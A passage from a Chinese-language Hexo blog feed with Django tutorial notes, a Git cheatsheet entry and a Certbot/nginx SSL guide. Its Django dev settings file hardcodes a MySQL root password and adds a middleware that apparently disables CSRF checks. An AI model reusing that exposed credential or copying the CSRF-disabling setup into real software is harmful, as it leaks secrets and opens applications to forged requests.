repository.<br><br></code></pre></td></tr></table></figure><p>剩下的推送就简单了。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新建Django的第一个应用</title>
      <link href="/2017/08/18/Django%E5%85%A5%E9%97%A8-2-%E6%96%B0%E5%BB%BAdjango%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8/"/>
      <url>/2017/08/18/Django%E5%85%A5%E9%97%A8-2-%E6%96%B0%E5%BB%BAdjango%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h3 id="2-3-3-Creating-the-Polls-app"><a href="#2-3-3-Creating-the-Polls-app" class="headerlink" title="2.3.3 Creating the Polls app"></a>2.3.3 Creating the Polls app<p>Now that your environment – a “project” – is set up, you’re set to start doing work.<br>Each application you write in Django consists of a Python package that follows a certain convention. Django comes<br>with a utility that automatically generates the basic directory structure of an app, so you can focus on writing code<br>rather than creating directories.<br>Projects vs. apps<br>What’s the difference between a project and an app? An app is aWeb application that does something – e.g., aWeblog<br>system, a database of public records or a small poll app. A project is a collection of configuration and apps for a<br>particular website. A project can contain multiple apps. An app can be in multiple projects.<br>Your apps can live anywhere on your Python path. In this tutorial, we’ll create our poll app in the same directory as<br>your manage.py file so that it can be imported as its own top-level module, rather than a submodule of mysite.<br>To create your app, make sure you’re in the same directory as manage.py and type this command:</p><pre><code>$ python manage.py startapp polls</code></pre><p>That’ll create a directory polls, which is laid out like this:<br>16</p><pre><code>根urls.pyurlpatterns=[    path(&#39;admin/&#39;,admin.site.urls),    path(&#39;hello/&#39;,include(&#39;myapp.urls&#39;)),    path(&#39;sign/&#39;,include(&#39;myapp.urls&#39;)),]</code></pre><span id="more"></span>        <p>#django的处理流程，根urls.py.（Django使用的是根URLconf模块。这个值通常是通过ROOT_URLCONF</p><pre><code>#设置（在.../settings.py中）ROOT_URLCONF=&#39;djangonew.urls&#39;</code></pre><h4 id="3-Django加载URLconf模块（urls-py文件，并寻找可用的urlpatterns"><a href="#3-Django加载URLconf模块（urls-py文件，并寻找可用的urlpatterns" class="headerlink" title="3,Django加载URLconf模块（urls.py文件，并寻找可用的urlpatterns"></a>3,Django加载URLconf模块（urls.py文件，并寻找可用的urlpatterns</h4><h4 id="4-Django依次匹配每个URL模块，直到匹配到相对应的模块处。"><a href="#4-Django依次匹配每个URL模块，直到匹配到相对应的模块处。" class="headerlink" title="4,Django依次匹配每个URL模块，直到匹配到相对应的模块处。"></a>4,Django依次匹配每个URL模块，直到匹配到相对应的模块处。</h4><h4 id="5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。"><a href="#5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。" class="headerlink" title="5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。"></a>5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。</h4><h4 id="6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。"><a href="#6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。" class="headerlink" title="6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。"></a>6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。</h4><pre><code>  include(myapp.urls) 转到   myapp 中的 urls.py  ,映射到 views , views.hello 方法。fromdjango.urlsimportpathfrom.importviewsurlpatterns=[path(&#39;&#39;,views.hello,name=&#39;hello&#39;),path(&#39;&#39;,views.hello,name=&#39;sign&#39;)]Name 对应，urlViewsfromdjango.shortcutsimportrender#Createyourviewshere.fromdjango.httpimportHttpResponse#需要导入HttpResponse模块defhello(request):context=&#123;&#125;context[&#39;hello&#39;]=&#39;HelloWorld&#39;returnrender(request,&#39;hello.html&#39;,context)</code></pre><h6 id="request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容"><a href="#request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容" class="headerlink" title="request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容"></a>request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容</h6><h6 id="returnHttpResponse-“Helloworld-”-不能直接字符串，必须是由这个类封装，此为Django规则"><a href="#returnHttpResponse-“Helloworld-”-不能直接字符串，必须是由这个类封装，此为Django规则" class="headerlink" title="returnHttpResponse(“Helloworld!”)#不能直接字符串，必须是由这个类封装，此为Django规则"></a>returnHttpResponse(“Helloworld!”)#不能直接字符串，必须是由这个类封装，此为Django规则</h6></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django-dev.py</title>
      <link href="/2017/08/18/Django-dev%E7%8E%AF%E5%A2%83/"/>
      <url>/2017/08/18/Django-dev%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <figure><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> settings.common <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># for multi computer room deploy and use separate redis server</span><br>DEPLOY_ZONE  = <span class="hljs-string">&#x27;&#x27;</span><br><br>MIDDLEWARE = [<br>    <span class="hljs-string">&#x27;service.csrf_service.DisableCSRF&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.security.SecurityMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;service.permission.api_permission.ApiPermissionCheck&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;</span>,<br>]<br></code></pre></td></tr></table><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="hljs-string">&#x27;media&#x27;</span>)<br>MEDIA_URL = <span class="hljs-string">&#x27;/media/&#x27;</span><br><br><span class="hljs-comment"># Database</span><br><span class="hljs-comment"># https://docs.djangoproject.com/en/1.11/ref/settings/#databases</span><br><br>DATABASES = &#123;<br>    <span class="hljs-string">&#x27;default&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;ENGINE&#x27;</span>: <span class="hljs-string">&#x27;django.db.backends.mysql&#x27;</span>,  <span class="hljs-comment"># Add &#x27;postgresql_psycopg2&#x27;, &#x27;mysql&#x27;, &#x27;sqlite3&#x27; or &#x27;oracle&#x27;.</span><br>            <span class="hljs-string">&#x27;NAME&#x27;</span>: <span class="hljs-string">&#x27;loonflownew&#x27;</span>,  <span class="hljs-comment"># Or path to database file if using sqlite3.</span><br>            <span class="hljs-string">&#x27;USER&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>,  <span class="hljs-comment"># Not used with sqlite3.</span><br>            <span class="hljs-string">&#x27;PASSWORD&#x27;</span>: <span class="hljs-string">&#x27;8&#123;U]@El5C/)H&#x27;</span>,  <span class="hljs-comment"># Not used with sqlite3.</span><br>            <span class="hljs-string">&#x27;HOST&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,  <span class="hljs-comment"># Set to empty string for localhost. Not used with sqlite3.</span><br>            <span class="hljs-string">&#x27;PORT&#x27;</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,  <span class="hljs-comment"># Set to empty string for default. Not used with sqlite3.</span><br>        &#125;<br>&#125;<br><br>REDIS_HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>REDIS_PORT = <span class="hljs-number">6379</span><br>REDIS_DB = <span class="hljs-number">0</span><br>REDIS_PASSWORD = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> REDIS_PASSWORD:<br>    CELERY_BROKER_URL = <span class="hljs-string">&#x27;redis://:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(REDIS_PASSWORD, REDIS_HOST, REDIS_PORT, REDIS_DB)<br><span class="hljs-keyword">else</span>:<br>    CELERY_BROKER_URL = <span class="hljs-string">&#x27;redis://&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(REDIS_HOST, REDIS_PORT, REDIS_DB)<br><br>LOGGING = &#123;<br>        <span class="hljs-string">&#x27;version&#x27;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&#x27;disable_existing_loggers&#x27;</span>: <span class="hljs-literal">False</span>,<br>        <span class="hljs-string">&#x27;filters&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;require_debug_true&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;()&#x27;</span>: <span class="hljs-string">&#x27;django.utils.log.RequireDebugTrue&#x27;</span>,<br>            &#125;,<br>        &#125;,<br>        <span class="hljs-string">&#x27;formatters&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;standard&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;format&#x27;</span>: <span class="hljs-string">&#x27;%(asctime)s %(pathname)s process-%(process)d thread-%(thread)d %(lineno)d [%(levelname)s]: %(message)s&#x27;</span>,<br>            &#125;,<br>        &#125;,<br>        <span class="hljs-string">&#x27;handlers&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;file_handler&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                <span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;logging.FileHandler&#x27;</span>,<br>                <span class="hljs-string">&#x27;filename&#x27;</span>: HOMEPATH + <span class="hljs-string">&#x27;/loonflow.log&#x27;</span>,<br>                <span class="hljs-string">&#x27;formatter&#x27;</span>: <span class="hljs-string">&#x27;standard&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;console&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                <span class="hljs-string">&#x27;filters&#x27;</span>: [<span class="hljs-string">&#x27;require_debug_true&#x27;</span>],<br>                <span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;logging.StreamHandler&#x27;</span>,<br>                <span class="hljs-string">&#x27;formatter&#x27;</span>: <span class="hljs-string">&#x27;standard&#x27;</span><br>            &#125;,<br>        &#125;,<br>        <span class="hljs-string">&#x27;loggers&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;django&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;handlers&#x27;</span>: [<span class="hljs-string">&#x27;file_handler&#x27;</span>],<br>                <span class="hljs-string">&#x27;propagate&#x27;</span>: <span class="hljs-literal">True</span>,<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;INFO&#x27;</span>,<br>                        &#125;,<br>            <span class="hljs-string">&#x27;django.db.backends&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;handlers&#x27;</span>: [<span class="hljs-string">&#x27;console&#x27;</span>],<br>                <span class="hljs-string">&#x27;propagate&#x27;</span>: <span class="hljs-literal">True</span>,<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;INFO&#x27;</span>,<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django入门</title>
      <link href="/2017/08/18/Django%E5%85%A5%E9%97%A8/"/>
      <url>/2017/08/18/Django%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h3 id="（1）安装特定版本的-django"><a href="#（1）安装特定版本的-django" class="headerlink" title="（1）安装特定版本的 django"></a>（1）安装特定版本的 django<pre><code>C:\Program Files\Python37\Scripts\security&gt;pip install django==2.2Collecting django==2.2  Using cached Django-2.2-py3-none-any.whl (7.4 MB)Requirement already satisfied: pytz in c:\program files\python37\lib\site-packages (from django==2.2) (2019.3)Requirement already satisfied: sqlparse in c:\program files\python37\lib\site-packages (from django==2.2) (0.3.1)Installing collected packages: djangoSuccessfully installed django-2.2</code></pre><h3 id="（2）创建项目"><a href="#（2）创建项目" class="headerlink" title="（2）创建项目"></a>（2）创建项目</h3><p>C:\Program Files\Python37\Scripts 目录下运行</p><pre><code>django-admin startproject mysite</code></pre><p>（备注利用 pycham 自行创建了一个djangonew 的项目。其中，django 事先进行了安装，导致系统报错了。对django 进行卸载后，顺利建立了该项目。]</p><pre><code>Pip uninstall django </code></pre><p>创建站点或者说是app,应用等。<br>2.3.3 Creating the Polls app<br>Now that your environment – a “project” – is set up, you’re set to start doing work.<br>Each application you write in Django consists of a Python package that follows a certain convention. Django comes<br>with a utility that automatically generates the basic directory structure of an app, so you can focus on writing code<br>rather than creating directories.<br>Projects vs. apps<br>What’s the difference between a project and an app? An app is aWeb application that does something – e.g., aWeblog<br>system, a database of public records or a small poll app. A project is a collection of configuration and apps for a<br>particular website. A project can contain multiple apps. An app can be in multiple projects.<br>Your apps can live anywhere on your Python path. In this tutorial, we’ll create our poll app in the same directory as<br>your manage.py file so that it can be imported as its own top-level module, rather than a submodule of mysite.<br>To create your app, make sure you’re in the same directory as manage.py and type this command:<br>$ python manage.py startapp polls<br>That’ll create a directory polls, which is laid out like this:</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git操作命令集锦</title>
      <link href="/2017/08/18/Git%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E9%94%A6-PDF%E7%89%88/"/>
      <url>/2017/08/18/Git%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E9%94%A6-PDF%E7%89%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h3 id="由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。"><a href="#由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。" class="headerlink" title="由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。"></a>由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。<div class="row">    <embed src="/pdf/git-cheatsheet.pdf" width="100%" height="550" type="application/pdf"></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Git </tag>
            
            <tag> PDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何免费的获取无限期ssl证书</title>
      <link href="/2017/06/30/%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E8%8E%B7%E5%8F%96%E6%97%A0%E9%99%90%E6%9C%9Fssl%E8%AF%81%E4%B9%A6/"/>
      <url>/2017/06/30/%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E8%8E%B7%E5%8F%96%E6%97%A0%E9%99%90%E6%9C%9Fssl%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<p>自己做了一个博客网站，hexo ,加 相应的模板。几经修改，申请备案了域名。 buhuixiu.com. 但是上线的时候发现，浏览器默认跑https，而相应的nginx 需要配置证书。。如果自己生成的证书，将会提示证书不可信。 如果取买，动辄上千一年，比我自己买的VPS还贵。如果手动取申请，也只能免费3个月，3个月后又需要去手动申请。麻烦。有没有好点的解决办法？</p><h4 id="解决办法-将申请三个月免费证书的动作计划执行。"><a href="#解决办法-将申请三个月免费证书的动作计划执行。" class="headerlink" title="解决办法-将申请三个月免费证书的动作计划执行。"></a>解决办法-将申请三个月免费证书的动作计划执行。</h4><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>centos:   (centos linux release 7.2.1511)<br>nginx:   (nginx version : nginx/1.18.0)<br>nginx 安装路径 :    /usr/local/nginx<br>EXpressJS应用<br>域名： <a href="http://www.buhuixiu.com/">www.buhuixiu.com</a></p><h4 id="安装CertBot"><a href="#安装CertBot" class="headerlink" title="安装CertBot"></a>安装CertBot</h4><p>命令行运行，键入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum install epel-release<br>sudo yum install certbot<br><br><br></code></pre></td></tr></table></figure><h4 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h4><p>这里我不想使用CertBot的standalone模式，这个模式虽然可以配置好服务器，但是以后Renew的时候，需要让服务停止一下，再启动。因此抛弃这个模式，我们使用Webroot配置模式。</p><p>因为，CertBot在验证服务器域名的时候，会生成一个随机文件，然后CertBot的服务器会通过HTTP访问你的这个文件，因此要确保你的Nginx配置好，以便可以访问到这个文件。</p><p>修改你的服务器配置，在server模块添加：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>location ^~ /.well-known/acme-challenge/ &#123;<br>   default_type &quot;text/plain&quot;;<br>   root   /usr/local/nginx/html;<br><span class="hljs-meta">#</span><span class="bash">   root     nginx安装路径/html;</span><br>&#125;<br><br>location = /.well-known/acme-challenge/ &#123;<br>   return 404;<br>&#125;<br></code></pre></td></tr></table></figure><p>重启nginx服务，这是在将nginx 注册成服务才可以使用，没有注册成服务使用-s reload. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart nginx<br></code></pre></td></tr></table></figure><h4 id="手动生成证书测试"><a href="#手动生成证书测试" class="headerlink" title="手动生成证书测试"></a>手动生成证书测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>sudo certbot certonly --webroot -w /usr/local/nginx/html/ -d www.buhuixiu.com<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> sudo certbot certonly --webroot -w nginx 安装路径/html/ -d 你的域名</span><br></code></pre></td></tr></table></figure><p>如果提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>IMPORTANT NOTES:<br> - Congratulations! Your certificate and chain have been saved at<br>   /etc/letsencrypt/live/your.domain.com/fullchain.pem. Your cert<br>   will expire on 20XX-09-23. To obtain a new or tweaked version of<br>   this certificate in the future, simply run certbot again. To<br>   non-interactively renew *all* of your certificates, run &quot;certbot<br>   renew&quot;<br> - If you like Certbot, please consider supporting our work by:<br><br>   Donating to ISRG / Let&#x27;s Encrypt:   https://letsencrypt.org/donate<br>   Donating to EFF:                    https://eff.org/donate-le<br><br><br><br><br></code></pre></td></tr></table></figure><p>-Congratulations 恭喜，则证书生成成功。</p><h4 id="配置nginx-，启用443端口，配置证书路径。"><a href="#配置nginx-，启用443端口，配置证书路径。" class="headerlink" title="配置nginx ，启用443端口，配置证书路径。"></a>配置nginx ，启用443端口，配置证书路径。</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">     HTTPS server</span><br><span class="hljs-meta">#</span><span class="bash"> </span>  <br>    server &#123;<br>        listen       443 ssl;<br>        server_name  www.buhuixiu.com;<br><span class="hljs-meta">#</span><span class="bash"> server_name 你的域名</span><br><br>        ssl_certificate /etc/letsencrypt/live/www.buhuixiu.com/fullchain.pem;<br><span class="hljs-meta"> #</span><span class="bash">       ssl_certificate /etc/letsencrypt/live/你的域名/fullchain.pem;</span> <br> <br>        ssl_certificate_key /etc/letsencrypt/live/www.buhuixiu.com/privkey.pem;<br>        ssl_trusted_certificate /etc/letsencrypt/live/www.buhuixiu.com/chain.pem;<br><span class="hljs-meta">#</span><span class="bash">       ssl_session_cache    shared:SSL:1m;</span><br><span class="hljs-meta">#</span><span class="bash">      ssl_session_timeout  5m;</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment">#       ssl_ciphers  HIGH:!aNULL:!MD5;</span></span><br><span class="hljs-meta">#</span><span class="bash">      ssl_prefer_server_ciphers  on;</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">      location / &#123;</span><br>            root   /home/git/projects/blog;<br>            index  index.html index.htm;<br><br>            <br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="自动更新证书"><a href="#自动更新证书" class="headerlink" title="自动更新证书"></a>自动更新证书</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo certbot renew --dry-run<br><br></code></pre></td></tr></table></figure><p>模拟更新成功的效果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>-------------------------------------------------------------------------------<br>Processing /etc/letsencrypt/renewal/your.domain.com.conf<br>-------------------------------------------------------------------------------<br>** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry<br>**          (The test certificates below have not been saved.)<br><br>Congratulations, all renewals succeeded. The following certs have been renewed:<br>  /etc/letsencrypt/live/your.domain.com/fullchain.pem (success)<br>** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry<br>**          (The test certificates above have not been saved.)<br><br><br><br></code></pre></td></tr></table></figure><p>既然模拟成功了，就用crontab -e来添加计划任务，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>sudo crontab -e<br></code></pre></td></tr></table></figure><p>添加配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>30 2  1 * *  /usr/bin/certbot renew  &gt;&gt; /var/log/le-renew.log<br><br></code></pre></td></tr></table></figure><p>每月1号的2点30分执行计划任务。<br>你可以在命令行执行/usr/bin/certbot renew &gt;&gt; /var/log/le-renew.log看看是否执行正常，如果一切OK，那么我们的配置到此结束！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>手把手教你在Nginx上使用CertBot    <a href="https://segmentfault.com/a/1190000005797776">https://segmentfault.com/a/1190000005797776</a>   </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> ssl </tag>
            
            <tag> CertBot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 部署到 github</title>
      <link href="/2017/05/27/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0github/"/>
      <url>/2017/05/27/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0github/</url>
      
